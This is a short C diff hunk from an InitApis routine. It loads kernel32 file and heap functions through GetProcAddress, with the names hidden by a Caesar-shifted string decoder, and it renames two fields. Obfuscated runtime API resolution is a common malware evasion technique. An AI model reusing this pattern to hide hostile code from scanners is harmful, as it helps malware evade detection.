@@ -26,8 +26,8 @@ void InitApis() {
 	Api.CreateFileA = (TCreateFileA)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjKnqjF"));
 	Api.HeapAlloc = (THeapAlloc)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("MjfuFqqth"));
 	Api.HeapCreate = (THeapCreate)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("MjfuHwjfyj"));
-	Api.HeapFree = (THeapFree)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("MjfuKwjj"));
-	Api.HeapReAlloc = (THeapReAlloc)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("MjfuWjFqqth"));
+	Api.Heapfree_ = (THeapfree_)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("MjfuKwjj"));
+	Api.Heaprealloc_ = (THeaprealloc_)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("MjfuWjFqqth"));
 	Api.CreateFileW = (TCreateFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("HwjfyjKnqj\\"));
 	Api.ReadFile = (TReadFile)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("WjfiKnqj"));
 	Api.WriteFile = (TWriteFile)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("\\wnyjKnqj"));
